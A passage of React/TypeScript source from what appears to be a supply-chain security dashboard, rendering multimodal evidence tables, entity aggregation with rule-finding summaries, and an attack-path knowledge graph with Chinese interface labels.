                  <CollapsibleContent className='mt-3 rounded-md border data-[state=closed]:animate-out data-[state=open]:animate-in data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:slide-out-to-top-1 data-[state=open]:slide-in-from-top-1'>
                    <div ref={textDetailsRef} className='max-h-[65vh] overflow-auto [scrollbar-gutter:stable]'>
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>类型</TableHead>
                          <TableHead>来源</TableHead>
                          <TableHead>识别文本</TableHead>
                          <TableHead>置信度</TableHead>
                          <TableHead>引擎</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {textRecognitions.map((item) => (
                          <TableRow key={`${item.evidence_id}-${item.evidence_type}-${item.source_path}-${item.recognized_text}`}>
                            <TableCell>
                              <Badge variant='outline' className={cn('rounded-md', multimodalRecognitionClass(item.evidence_type))}>
                                {multimodalRecognitionLabel(item.evidence_type)}
                              </Badge>
                            </TableCell>
                            <TableCell className='min-w-[220px]'>
                              <div className='font-medium'>{item.source_name}</div>
                              <code className='mt-1 block truncate text-xs text-muted-foreground' title={item.evidence_id}>{item.evidence_id}</code>
                              <code className='mt-1 block truncate text-xs text-muted-foreground' title={item.source_path}>{item.source_path}</code>
                            </TableCell>
                            <TableCell className='max-w-[560px]'>
                              <div className='whitespace-pre-wrap rounded-md bg-muted px-3 py-2 text-sm leading-6'>
                                {item.recognized_text}
                              </div>
                            </TableCell>
                            <TableCell className='whitespace-nowrap'>{Math.round((item.confidence ?? 0) * 100)}%</TableCell>
                            <TableCell className='text-sm text-muted-foreground'>{item.engine}</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </>
            ) : (
              <div className='rounded-md border border-dashed p-8 text-center text-sm text-muted-foreground'>
                暂无文本证据；安装 ASR/OCR 引擎后上传音频或截图会在这里显示识别结果。
              </div>
            )}
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-start justify-between gap-3'>
              <div>
                <CardTitle className='flex items-center gap-2 text-base'>
                  <ClipboardList className='size-4 text-emerald-600' />
                  证据来源
                </CardTitle>
              </div>
              <Badge variant='outline' className='rounded-md'>
                {evidence.length} 份材料
              </Badge>
            </div>
          </CardHeader>
          <CardContent className='space-y-4'>
            {evidence.length ? (
              <>
                <div className='grid gap-3 sm:grid-cols-2 xl:grid-cols-4'>
                  <AuditMetric label='材料总数' value={evidence.length} tone='slate' />
                  <AuditMetric label='规则命中' value={findingRows.length} tone='red' />
                  <AuditMetric label='抽取实体' value={entityRows.length} tone='cyan' />
                  <AuditMetric label='总大小(KB)' value={Math.round(evidence.reduce((sum, item) => sum + item.size_bytes, 0) / 1024)} tone='emerald' />
                </div>

                <div className='grid gap-2 sm:grid-cols-3'>
                  {(['image', 'audio', 'video'] as MultimodalSourceType[]).map((sourceType) => {
                    const count = evidence.filter((item) => item.source_type === sourceType).length
                    return (
                      <div key={sourceType} className='flex items-center justify-between rounded-md border bg-muted/20 px-3 py-2'>
                        <MultimodalSourceBadge sourceType={sourceType} />
                        <span className='text-sm font-semibold'>{count}</span>
                      </div>
                    )
                  })}
                </div>

                <div className='space-y-2'>
                  <div className='flex items-center justify-between gap-3'>
                    <div className='text-sm font-medium'>重点来源</div>
                  </div>
                  <div className='grid gap-3 lg:grid-cols-2'>
                    {(highlightedEvidenceSources.length ? highlightedEvidenceSources : evidenceSourceSummaries.slice(0, 4)).map(({ item, entityCount, findingCount, recognitionCount }) => (
                      <div key={item.evidence_id} className='rounded-md border bg-muted/15 p-3'>
                        <div className='flex flex-wrap items-start justify-between gap-3'>
                          <div className='min-w-0'>
                            <div className='flex flex-wrap items-center gap-2'>
                              <MultimodalSourceBadge sourceType={item.source_type} />
                              <span className='truncate font-medium' title={item.original_filename || item.filename}>
                                {item.original_filename || item.filename}
                              </span>
                            </div>
                            <code className='mt-2 block truncate text-xs text-muted-foreground' title={item.evidence_id}>
                              {item.evidence_id}
                            </code>
                          </div>
                          <div className='text-right text-xs text-muted-foreground'>
                            <div>{formatBytes(item.size_bytes)}</div>
                            <div>{formatTimestamp(item.uploaded_at)}</div>
                          </div>
                        </div>
                        <div className='mt-3 flex flex-wrap gap-2'>
                          <Badge variant='outline' className={cn('rounded-md', findingCount ? severityClasses.high : statusClasses.observed)}>
                            {findingCount} 条规则
                          </Badge>
                          <Badge variant='outline' className={cn('rounded-md', entityCount ? statusClasses.active : statusClasses.observed)}>
                            {entityCount} 个实体
                          </Badge>
                          <Badge variant='outline' className='rounded-md'>
                            {recognitionCount} 条文本
                          </Badge>
                        </div>
                        <code className='mt-3 block truncate rounded bg-muted px-2 py-1 text-xs text-muted-foreground' title={item.sha256}>
                          sha256:{item.sha256.slice(0, 18)}...
                        </code>
                      </div>
                    ))}
                  </div>
                </div>

                <Collapsible open={sourceDetailsOpen} onOpenChange={setSourceDetailsOpen}>
                  <CollapsibleTrigger asChild>
                    <Button
                      type='button'
                      variant='outline'
                      className='w-full justify-between rounded-md transition-[border-color,background-color,box-shadow,transform] duration-300 hover:-translate-y-0.5 hover:border-cyan-400/40 hover:shadow-md active:translate-y-0'
                      aria-expanded={sourceDetailsOpen}
                    >
                      查看全部来源明细
                      <ChevronDown className={cn('size-4 transition-transform duration-300', sourceDetailsOpen && 'rotate-180')} />
                    </Button>
                  </CollapsibleTrigger>
                  <CollapsibleContent className='mt-3 rounded-md border data-[state=closed]:animate-out data-[state=open]:animate-in data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:slide-out-to-top-1 data-[state=open]:slide-in-from-top-1'>
                    <div ref={sourceDetailsRef} className='max-h-[65vh] overflow-auto [scrollbar-gutter:stable]'>
                    <Table>
                      <TableHeader>
                        <TableRow>
                          <TableHead>类型</TableHead>
                          <TableHead>Evidence ID</TableHead>
                          <TableHead>文件路径</TableHead>
                          <TableHead>元数据</TableHead>
                          <TableHead>大小</TableHead>
                          <TableHead>上传时间</TableHead>
                        </TableRow>
                      </TableHeader>
                      <TableBody>
                        {evidence.map((item) => (
                          <TableRow key={item.evidence_id}>
                            <TableCell>
                              <MultimodalSourceBadge sourceType={item.source_type} />
                            </TableCell>
                            <TableCell className='min-w-[220px]'>
                              <div className='font-medium'>{item.original_filename || item.filename}</div>
                              <code className='mt-1 block truncate text-xs text-muted-foreground' title={item.evidence_id}>{item.evidence_id}</code>
                              <code className='mt-1 block truncate text-xs text-muted-foreground' title={item.sha256}>
                                sha256:{item.sha256.slice(0, 18)}...
                              </code>
                            </TableCell>
                            <TableCell className='max-w-[360px]'>
                              <code className='block truncate rounded bg-muted px-2 py-1 text-xs' title={item.relative_path || item.file_path}>
                                {item.relative_path || item.file_path}
                              </code>
                            </TableCell>
                            <TableCell className='min-w-[160px] text-sm text-muted-foreground'>
                              {multimodalMetadataSummary(item)}
                            </TableCell>
                            <TableCell className='whitespace-nowrap'>{formatBytes(item.size_bytes)}</TableCell>
                            <TableCell className='whitespace-nowrap font-mono text-xs'>
                              {formatTimestamp(item.uploaded_at)}
                            </TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                    </div>
                  </CollapsibleContent>
                </Collapsible>
              </>
            ) : (
              <div className='rounded-md border border-dashed p-8 text-center text-sm text-muted-foreground'>
                暂无多模态证据来源。
              </div>
            )}
          </CardContent>
        </Card>
      </div>

      <div className={moduleSidebarColumnClass}>
        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <Boxes className='size-4 text-cyan-600' />
              存储索引
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-3'>
            <div className='rounded-md border p-3'>
              <div className='text-xs text-muted-foreground'>目录</div>
              <code className='mt-1 block break-all text-xs'>
                {summary?.storage_relative_dir || 'storage/multimodal'}
              </code>
            </div>
            <div className='grid grid-cols-2 gap-3'>
              <AuditMetric label='总大小(KB)' value={Math.round((summary?.total_size_bytes ?? 0) / 1024)} tone='slate' />
              <AuditMetric label='耗时(秒)' value={Math.round(summary?.duration_seconds ?? 0)} tone='cyan' />
            </div>
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <TerminalSquare className='size-4 text-slate-600' />
              多模态工具
            </CardTitle>
          </CardHeader>
          <CardContent>
            <ScannerStatusList scanners={result?.tools ?? []} />
          </CardContent>
        </Card>

        <Card className={moduleCardClass}>
          <CardHeader>
            <CardTitle className='flex items-center gap-2 text-base'>
              <FileSearch className='size-4 text-orange-600' />
              派生产物
            </CardTitle>
          </CardHeader>
          <CardContent className='space-y-2'>
            {derivedArtifacts.length ? derivedArtifacts.map((artifact) => (
              <div key={`${artifact.evidence_id}-${artifact.kind}-${artifact.path}`} className='rounded-md border p-3'>
                <div className='flex items-center justify-between gap-3'>
                  <Badge variant='outline' className='rounded-md'>
                    {artifact.kind}
                  </Badge>
                  <span className='text-xs text-muted-foreground'>{artifact.tool}</span>
                </div>
                <div className='mt-2 text-sm font-medium'>{artifact.source_name}</div>
                <code className='mt-1 block break-all text-xs text-muted-foreground'>
                  {artifact.relative_path || artifact.path}
                </code>
              </div>
            )) : (
              <div className='rounded-md border border-dashed p-4 text-sm text-muted-foreground'>
                暂无派生产物；FFmpeg 可用时会生成音频 wav 或视频帧。
              </div>
            )}
          </CardContent>
        </Card>

        {warnings.length ? (
          <Card className={moduleCardClass}>
            <CardHeader>
              <CardTitle className='flex items-center gap-2 text-base'>
                <AlertTriangle className='size-4 text-amber-600' />
                处理提示
              </CardTitle>
            </CardHeader>
            <CardContent className='space-y-2'>
              {warnings.map((warning) => (
                <div key={warning} className='rounded-md bg-muted px-3 py-2 text-xs text-muted-foreground'>
                  {warning}
                </div>
              ))}
            </CardContent>
          </Card>
        ) : null}
      </div>
    </div>
  )
}

function MultimodalSourceBadge({ sourceType }: { sourceType: MultimodalSourceType }) {
  const Icon = sourceType === 'audio' ? Music2 : sourceType === 'video' ? Video : Images
  const className =
    sourceType === 'audio'
      ? statusClasses.active
      : sourceType === 'video'
        ? severityClasses.medium
        : 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300'
  return (
    <Badge variant='outline' className={cn('rounded-md', className)}>
      <Icon className='size-3.5' />
      {sourceType === 'audio' ? '音频' : sourceType === 'video' ? '视频' : '图像'}
    </Badge>
  )
}

function entityTypeLabel(value: string) {
  const labels: Record<string, string> = {
    ip: 'IP',
    domain: '域名',
    cve: 'CVE',
    package: '依赖包',
    api_path: '接口',
    service: '服务',
    action: '行为',
    time: '时间',
    secret_keyword: '凭据',
  }
  return labels[value] ?? value
}

function entityBadgeClass(value: string) {
  if (value === 'ip' || value === 'package') return severityClasses.high
  if (value === 'api_path' || value === 'secret_keyword') return severityClasses.medium
  if (value === 'action') return 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300'
  if (value === 'time') return statusClasses.observed
  return statusClasses.active
}

function aggregateMultimodalEntities(
  rows: MultimodalEntityRow[],
  findings: MultimodalFindingRow[]
): MultimodalEntitySummary[] {
  const groups = new Map<string, MultimodalEntitySummary>()
  rows.forEach((entity) => {
    const normalized = (entity.normalized || entity.value || '').trim()
    const value = (entity.value || normalized || '未知实体').trim()
    const key = `${entity.type}:${normalized || value}`.toLowerCase()
    const group = multimodalEntityGroupForType(entity.type)
    const current = groups.get(key)
    if (!current) {
      groups.set(key, {
        key,
        type: entity.type,
        value,
        normalized,
        count: 1,
        sourceCount: 1,
        confidence: entity.confidence ?? 0,
        sourceNames: [entity.source_name],
        evidenceIds: [entity.evidence_id],
        examples: entity.evidence ? [entity.evidence] : [],
        group,
        ruleCount: 0,
        maxRuleScore: 0,
        maxRuleSeverity: null,
        ruleSummaries: [],
      })
      return
    }
    current.count += 1
    current.confidence = Math.max(current.confidence, entity.confidence ?? 0)
    if (!current.sourceNames.includes(entity.source_name)) {
      current.sourceNames.push(entity.source_name)
      current.sourceCount = current.sourceNames.length
    }
    if (!current.evidenceIds.includes(entity.evidence_id)) current.evidenceIds.push(entity.evidence_id)
    if (entity.evidence && !current.examples.includes(entity.evidence) && current.examples.length < 3) {
      current.examples.push(entity.evidence)
    }
  })

  const summaries = Array.from(groups.values()).map((entity) => {
    const relatedFindings = findings.filter((finding) => multimodalFindingMatchesEntity(finding, entity))
    const ruleSummaries = summarizeMultimodalRulesForEntity(relatedFindings)
    const maxRule = ruleSummaries[0]
    return {
      ...entity,
      ruleCount: ruleSummaries.length,
      maxRuleScore: maxRule?.score ?? 0,
      maxRuleSeverity: maxRule?.severity ?? null,
      ruleSummaries,
    }
  })

  return summaries.sort((left, right) => {
    const importance = multimodalEntityImportance(right) - multimodalEntityImportance(left)
    if (importance !== 0) return importance
    const ruleScore = right.maxRuleScore - left.maxRuleScore
    if (ruleScore !== 0) return ruleScore
    const confidence = right.confidence - left.confidence
    if (confidence !== 0) return confidence
    return right.count - left.count
  })
}

function summarizeMultimodalRulesForEntity(findings: MultimodalFindingRow[]): MultimodalEntityRuleSummary[] {
  const groups = new Map<string, MultimodalEntityRuleSummary>()
  findings.forEach((finding) => {
    const key = finding.rule_id || finding.title || finding.id
    const current = groups.get(key)
    const entityValues = stableUniqueStrings((finding.entities ?? []).map((entity) => entity.value).filter(Boolean))
    const keywords = stableUniqueStrings(finding.matched_keywords ?? [])
    if (!current) {
      groups.set(key, {
        key,
        title: finding.title || finding.rule_id || '未命名规则',
        ruleId: finding.rule_id || finding.id,
        severity: finding.severity,
        score: finding.score ?? 0,
        count: 1,
        evidenceCount: 1,
        keywords,
        entities: entityValues,
        sourceNames: [finding.source_name],
        recommendation: finding.recommendation,
      })
      return
    }
    current.count += 1
    current.score = Math.max(current.score, finding.score ?? 0)
    current.severity = strongerSecuritySeverity(current.severity, finding.severity)
    current.keywords = stableUniqueStrings([...current.keywords, ...keywords])
    current.entities = stableUniqueStrings([...current.entities, ...entityValues])
    if (!current.sourceNames.includes(finding.source_name)) {
      current.sourceNames.push(finding.source_name)
      current.evidenceCount = current.sourceNames.length
    }
    if (!current.recommendation && finding.recommendation) {
      current.recommendation = finding.recommendation
    }
  })
  return Array.from(groups.values()).sort((left, right) => {
    const score = right.score - left.score
    if (score !== 0) return score
    return right.count - left.count
  })
}

function multimodalFindingMatchesEntity(finding: MultimodalFindingRow, entity: MultimodalEntitySummary) {
  const candidates = stableUniqueStrings([entity.value, entity.normalized])
    .map((value) => value.toLowerCase().trim())
    .filter((value) => value.length >= 2)
  if (!candidates.length) return false

  const directEntityText = (finding.entities ?? [])
    .map((item) => `${item.type} ${item.value} ${item.normalized}`)
    .join(' ')
    .toLowerCase()
  if (candidates.some((value) => directEntityText.includes(value))) return true

  const evidenceText = `${finding.evidence || ''} ${(finding.matched_keywords ?? []).join(' ')}`.toLowerCase()
  return candidates.some((value) => evidenceText.includes(value))
}

function stableUniqueStrings(values: string[]) {
  const result: string[] = []
  values.forEach((value) => {
    const clean = String(value || '').trim()
    if (clean && !result.includes(clean)) result.push(clean)
  })
  return result
}

function strongerSecuritySeverity(left: SecuritySeverity, right: SecuritySeverity): SecuritySeverity {
  const order: Record<SecuritySeverity, number> = { critical: 4, high: 3, medium: 2, low: 1 }
  return order[right] > order[left] ? right : left
}

function multimodalEntityGroups(summaries: MultimodalEntitySummary[]) {
  const labels: Record<MultimodalEntityGroup, string> = {
    package: '依赖包',
    ioc: '网络 IOC',
    service: '服务与接口',
    behavior: '行为关键词',
    time: '时间线索',
    other: '其他实体',
  }
  const counts = summaries.reduce<Record<MultimodalEntityGroup, number>>(
    (acc, entity) => {
      acc[entity.group] += 1
      return acc
    },
    { package: 0, ioc: 0, service: 0, behavior: 0, time: 0, other: 0 }
  )
  return (Object.keys(labels) as MultimodalEntityGroup[])
    .map((id) => ({ id, label: labels[id], count: counts[id] }))
    .filter((group) => group.count > 0)
}

function multimodalEntityGroupForType(value: string): MultimodalEntityGroup {
  if (value === 'package' || value === 'cve') return 'package'
  if (value === 'ip' || value === 'domain' || value === 'url') return 'ioc'
  if (value === 'api_path' || value === 'service' || value === 'endpoint') return 'service'
  if (value === 'action' || value === 'secret_keyword' || value === 'command' || value === 'process') return 'behavior'
  if (value === 'time') return 'time'
  return 'other'
}

function multimodalEntityImportance(entity: MultimodalEntitySummary) {
  const groupWeight: Record<MultimodalEntityGroup, number> = {
    package: 60,
    ioc: 55,
    service: 50,
    behavior: 35,
    time: 20,
    other: 10,
  }
  return groupWeight[entity.group] + entity.confidence * 10 + Math.min(entity.count, 10)
}

function multimodalEntityPathLabel(group: MultimodalEntityGroup) {
  return group === 'package' || group === 'ioc' || group === 'service' ? '可接入路径' : '辅助旁证'
}

function multimodalEntityPathClass(group: MultimodalEntityGroup) {
  if (group === 'package' || group === 'ioc') return severityClasses.high
  if (group === 'service') return statusClasses.active
  return statusClasses.observed
}

function multimodalMetadataSummary(item: MultimodalEvidence) {
  const width = Number(item.metadata?.width || 0)
  const height = Number(item.metadata?.height || 0)
  const duration = Number(item.metadata?.duration_seconds || 0)
  const codec = String(item.metadata?.video_codec || item.metadata?.audio_codec || '')
  const pieces = [
    width && height ? `${width}x${height}` : '',
    duration ? `${duration.toFixed(duration > 10 ? 1 : 2)}s` : '',
    codec,
    item.derived?.length ? `${item.derived.length} derived` : '',
  ].filter(Boolean)
  return pieces.join(' · ') || item.mime_type
}

function multimodalRecognitionLabel(value: string) {
  if (value === 'audio_asr') return '音频 ASR'
  if (value === 'visual_ocr') return '图片 OCR'
  return value || '文本识别'
}

function multimodalRecognitionClass(value: string) {
  if (value === 'audio_asr') return statusClasses.active
  if (value === 'visual_ocr') return 'border-cyan-200 bg-cyan-50 text-cyan-700 dark:border-cyan-900 dark:bg-cyan-950/45 dark:text-cyan-300'
  return statusClasses.observed
}

function KnowledgeGraph({ workspace }: { workspace: SecurityWorkspace }) {
  const graph = workspace.graph
  const graphNodes = graph?.nodes ?? []
  const graphEdges = graph?.edges ?? []
  const attackPaths = graph?.attack_paths ?? []
  const [selectedPathId, setSelectedPathId] = useState<string | null>(null)
  const [pathOnlyMode, setPathOnlyMode] = useState(false)
  const [activeNodeTypeFilter, setActiveNodeTypeFilter] = useState<string | null>(null)
  const [activeNodeGroupFilter, setActiveNodeGroupFilter] = useState<string | null>(null)
  const [graphSearch, setGraphSearch] = useState('')
  const [graphDisplayMode, setGraphDisplayMode] = useState<GraphDisplayMode>('all')
  const [graphWorkbenchView, setGraphWorkbenchView] = useState<GraphWorkbenchView>('map')
  const [flowInstance, setFlowInstance] = useState<ReactFlowInstance | null>(null)
  const [manualFocusNodeRef, setManualFocusNodeRef] = useState<string | null>(null)
  const attackPathList = useMemo(
    () => attackPaths.filter((path) => !isTrustProvenancePath(path)),
    [attackPaths]
  )
  const trustPathList = useMemo(
    () => attackPaths.filter((path) => isTrustProvenancePath(path)),
    [attackPaths]
  )
  useEffect(() => {
    const focusPathId = window.sessionStorage.getItem('supplyguard:focusAttackPath')
    if (!focusPathId || !attackPaths.some((path) => path.id === focusPathId)) return
    setSelectedPathId(focusPathId)
    setGraphDisplayMode('all')
    setGraphWorkbenchView('graph')
    window.sessionStorage.removeItem('supplyguard:focusAttackPath')
  }, [attackPaths])
  const displayedPaths = useMemo(() => {
    if (graphDisplayMode === 'attack') return attackPathList
    if (graphDisplayMode === 'trust') return trustPathList
    return attackPaths
  }, [attackPathList, attackPaths, graphDisplayMode, trustPathList])
  const selectedPath = useMemo(
    () => displayedPaths.find((path) => path.id === selectedPathId) ?? displayedPaths[0] ?? attackPaths[0],
    [attackPaths, displayedPaths, selectedPathId]
  )
  const selectedPathIsTrust = isTrustProvenancePath(selectedPath)
  const selectedPathIsVerifiedTrust = isVerifiedProvenancePath(selectedPath)
  const highlightedNodeIds = useMemo(
    () => new Set(selectedPath?.node_ids ?? []),
    [selectedPath]
  )
  const highlightedEdgeIds = useMemo(
    () => new Set(selectedPath?.edge_ids ?? []),
    [selectedPath]
  )
  const baseGraphNodes = useMemo(
    () =>
      pathOnlyMode && selectedPath
        ? graphNodes.filter((node) => highlightedNodeIds.has(node.id))
        : graphNodes,
    [graphNodes, highlightedNodeIds, pathOnlyMode, selectedPath]
  )
  const baseGraphEdges = useMemo(
    () =>
      pathOnlyMode && selectedPath
        ? graphEdges.filter((edge) => highlightedEdgeIds.has(edge.id))
        : graphEdges,
    [graphEdges, highlightedEdgeIds, pathOnlyMode, selectedPath]
  )
  useEffect(() => {
    if (!displayedPaths.length) {
      if (selectedPathId && !attackPaths.some((path) => path.id === selectedPathId)) {
        setSelectedPathId(null)
      }
      return
    }
    if (!selectedPathId || !displayedPaths.some((path) => path.id === selectedPathId)) {
      setSelectedPathId(displayedPaths[0].id)
    }
  }, [attackPaths, displayedPaths, selectedPathId])
  const nodeTypeCounts = useMemo(
    () => countGraphNodeTypes(baseGraphNodes),
    [baseGraphNodes]
  )
  const visibleGraphNodes = useMemo(
    () => {
      const groupFilteredNodes = activeNodeGroupFilter
        ? baseGraphNodes.filter((node) => graphNodeGroupForType(node.type) === activeNodeGroupFilter)
        : baseGraphNodes
      const typeFilteredNodes = activeNodeTypeFilter
        ? groupFilteredNodes.filter((node) => node.type === activeNodeTypeFilter)
        : groupFilteredNodes
      return filterGraphNodesBySearch(typeFilteredNodes, graphSearch)
    },
    [activeNodeGroupFilter, activeNodeTypeFilter, baseGraphNodes, graphSearch]
  )
  const visibleGraphEdges = useMemo(
    () => filterGraphEdgesForNodes(baseGraphEdges, visibleGraphNodes),
    [baseGraphEdges, visibleGraphNodes]
  )
  const searchMatchedCount = useMemo(
    () => (graphSearch.trim() ? filterGraphNodesBySearch(baseGraphNodes, graphSearch).length : 0),
    [baseGraphNodes, graphSearch]
  )
  const pipeline = workspace.pipeline ?? []
  const displayModes = useMemo(
    () => [
      { value: 'attack' as const, label: '攻击路径', count: attackPathList.length, icon: <Siren className='size-3.5' /> },
      { value: 'trust' as const, label: '可信证明链', count: trustPathList.length, icon: <ShieldCheck className='size-3.5' /> },
      { value: 'all' as const, label: '全部', count: attackPaths.length, icon: <Network className='size-3.5' /> },
    ],
    [attackPathList.length, attackPaths.length, trustPathList.length]
  )
  const graphFilters = graphNodeFilters(baseGraphNodes, nodeTypeCounts)
  const graphGroupFilters = graphNodeGroupFilters(baseGraphNodes)
  const nodes = useMemo<Node[]>(
    () =>
      visibleGraphNodes.map((node) => {
        const isPathNode = highlightedNodeIds.has(node.id)
        const pathBorder = selectedPathIsVerifiedTrust
          ? '2px solid color-mix(in oklch, #059669 72%, transparent)'
          : selectedPathIsTrust
            ? '2px solid color-mix(in oklch, #0f766e 62%, transparent)'
          : '2px solid color-mix(in oklch, var(--destructive) 70%, transparent)'
        const pathShadow = selectedPathIsVerifiedTrust
          ? '0 10px 24px color-mix(in oklch, #059669 18%, transparent)'
          : selectedPathIsTrust
            ? '0 10px 24px color-mix(in oklch, #0f766e 14%, transparent)'
          : '0 10px 24px color-mix(in oklch, var(--destructive) 18%, transparent)'
        return {
          id: node.id,
          position: node.position || graphPositions[node.id] || { x: 0, y: 0 },
          data: {
            label: (
              <div className='w-[150px] text-left'>
                <div className='flex items-center justify-between gap-2'>
                  <span className='truncate text-xs text-muted-foreground'>{node.type}</span>
                  <span
                    className={cn(
                      'size-2 rounded-full',
                      isPathNode && selectedPathIsTrust
                        ? 'bg-emerald-500'
                        : node.risk === 'critical'
                        ? 'bg-red-500'
                        : node.risk === 'high'
                          ? 'bg-orange-500'
                          : node.risk === 'low'
                            ? 'bg-emerald-500'
                            : 'bg-amber-500'
                    )}
                  />
                </div>
                <div className='mt-1 truncate text-sm font-semibold'>{node.label}</div>
                <div className='mt-1 line-clamp-1 text-xs text-muted-foreground'>
                  {node.description}
                </div>
                {node.score !== undefined ? (
                  <div className='mt-2 text-xs text-muted-foreground'>
                    score {node.score}
                  </div>
                ) : null}
              </div>
            ),
          },
          style: {
            borderRadius: 8,
            border: isPathNode ? pathBorder : '1px solid var(--border)',
            background: 'var(--background)',
            opacity: !pathOnlyMode && selectedPath && !isPathNode ? 0.42 : 1,
            padding: 8,
            width: 178,
            boxShadow: isPathNode ? pathShadow : '0 8px 18px color-mix(in oklch, var(--foreground) 7%, transparent)',
          },
        }
      }),
    [visibleGraphNodes, highlightedNodeIds, pathOnlyMode, selectedPath, selectedPathIsTrust, selectedPathIsVerifiedTrust]
  )

  const edges = useMemo<Edge[]>(
    () =>
      visibleGraphEdges.map((edge) => {
        const isPathEdge = highlightedEdgeIds.has(edge.id)
        const isEvidenceEdge = isEvidenceSupportEdge(edge.type)
        const pathColor = selectedPathIsVerifiedTrust ? '#059669' : selectedPathIsTrust ? '#0f766e' : '#dc2626'
        return {
          id: edge.id,
          source: edge.source,
          target: edge.target,
          label: edge.label,
          animated: isPathEdge || isEvidenceEdge,
          type: 'smoothstep',
          data: {
            relation: edge.type,
            reason: edge.reason,
          },
          markerEnd: {
            type: MarkerType.ArrowClosed,
            color: isPathEdge ? pathColor : isEvidenceEdge ? '#0891b2' : '#94a3b8',
          },
          style: {
            stroke: isPathEdge ? pathColor : isEvidenceEdge ? '#0891b2' : '#94a3b8',
            strokeDasharray: isPathEdge ? undefined : isEvidenceEdge ? '4 4' : '2 6',
            strokeWidth: isPathEdge ? 3.4 : isEvidenceEdge ? 2 : 1.4,
            opacity: isPathEdge ? 1 : isEvidenceEdge ? 0.78 : 0.34,
          },
        }
      }),
    [visibleGraphEdges, highlightedEdgeIds, selectedPathIsTrust, selectedPathIsVerifiedTrust]
  )
  const selectedPathStartNode = useMemo(() => {
    const startNodeRef = getPathStartNodeRef(selectedPath)
    if (!startNodeRef) return null
    return visibleGraphNodes.find((node) => node.id === startNodeRef || node.label === startNodeRef) ?? null
  }, [selectedPath, visibleGraphNodes])
  const manualFocusNode = useMemo(
    () => manualFocusNodeRef
      ? visibleGraphNodes.find((node) => node.id === manualFocusNodeRef || node.label === manualFocusNodeRef) ?? null
      : null,
    [manualFocusNodeRef, visibleGraphNodes]
  )
  const graphFocusNode = manualFocusNode ?? selectedPathStartNode

  useEffect(() => {
    if (!flowInstance || graphWorkbenchView !== 'graph' || !graphFocusNode) return

    const position = graphFocusNode.position ||
      graphPositions[graphFocusNode.id] ||
      { x: 0, y: 0 }
    const timer = window.setTimeout(() => {
      flowInstance.setCenter(position.x + 90, position.y + 60, {
        zoom: pathOnlyMode ? 1.05 : 0.82,
        duration: 450,
      })
    }, 80)

    return () => window.clearTimeout(timer)
  }, [flowInstance, graphFocusNode, graphWorkbenchView, pathOnlyMode])

  function focusGraphGroup(group: string | null) {
    setGraphWorkbenchView('graph')
    const scopedNodes = group
      ? baseGraphNodes.filter((node) => graphNodeGroupForType(node.type) === group)
      : baseGraphNodes
    const selectedStartRef = getPathStartNodeRef(selectedPath)
    const targetNode =
      scopedNodes.find((node) => selectedStartRef && (node.id === selectedStartRef || node.label === selectedStartRef)) ??
      scopedNodes.find((node) => highlightedNodeIds.has(node.id)) ??
      scopedNodes[0] ??
      null
    setManualFocusNodeRef(targetNode?.id ?? null)
  }

  function focusGraphType(type: string | null) {
    setGraphWorkbenchView('graph')
    const scopedNodes = type
      ? baseGraphNodes.filter((node) => node.type === type)
      : baseGraphNodes
    const targetNode =
      scopedNodes.find((node) => highlightedNodeIds.has(node.id)) ??
      scopedNodes[0] ??
      null
    setManualFocusNodeRef(targetNode?.id ?? null)
  }

  return (
    <div className='space-y-4'>
      <PathConclusionCard
        path={selectedPath}
        summary={graph?.summary}
        mode={graphDisplayMode}
        visibleNodeCount={nodes.length}
        visibleEdgeCount={edges.length}
      />

      <div className={cn(moduleSplitGridClass, 'xl:h-[calc(100vh-19rem)] xl:min-h-[480px] xl:grid-cols-[minmax(0,1fr)_380px]')}>
        <div className={cn(moduleMainColumnClass, 'xl:pb-6')}>
        <Card className={moduleCardClass}>
          <CardHeader>
            <div className='flex flex-wrap items-center justify-between gap-3'>
              <div>
            <CardTitle className='flex items-center gap-2 text-base'>
              <GitPullRequestArrow className='size-4 text-cyan-600' />
              攻击链地图
            </CardTitle>
              </div>
              <div className='flex flex-wrap gap-2'>
                {[
                  { value: 'map' as const, label: '攻击链地图' },
                  { value: 'heatmap' as const, label: '证据热力图' },
                  { value: 'graph' as const, label: '技术图谱' },
                ].map((view) => (
                  <Button
                    key={view.value}
                    type='button'
                    size='sm'
                    variant={graphWorkbenchView === view.value ? 'default' : 'outline'}
                    className='rounded-md'
                    onClick={() => setGraphWorkbenchView(view.value)}
                  >
                    {view.label}
                  </Button>
                ))}
              </div>
            </div>
          </CardHeader>
          <CardContent className='space-y-4'>
            <CompactPathSelector
              paths={displayedPaths}
              selectedPath={selectedPath}
              displayModes={displayModes}
              activeMode={graphDisplayMode}
              onModeChange={setGraphDisplayMode}
              onSelect={(path) => {
                setManualFocusNodeRef(null)
                setSelectedPathId(path.id)
              }}
            />

            {graphWorkbenchView === 'map' ? (
              <AttackChainMap
                path={selectedPath}
                graphNodes={graphNodes}
                selectedPathIsTrust={selectedPathIsTrust}
              />
            ) : null}

            {graphWorkbenchView === 'heatmap' ? (
              <EvidenceHeatmap
                path={selectedPath}
                graphNodes={graphNodes}
                selectedPathIsTrust={selectedPathIsTrust}
              />
            ) : null}

            {graphWorkbenchView === 'graph' ? (
              <div className='space-y-3'>
                <div className='grid gap-3 rounded-md border bg-muted/10 p-3 lg:grid-cols-[minmax(180px,0.7fr)_minmax(0,1fr)_minmax(180px,0.7fr)]'>
                  <div className='space-y-2'>
                    <div className='text-xs font-medium text-muted-foreground'>搜索证据</div>
                    <div className='relative'>
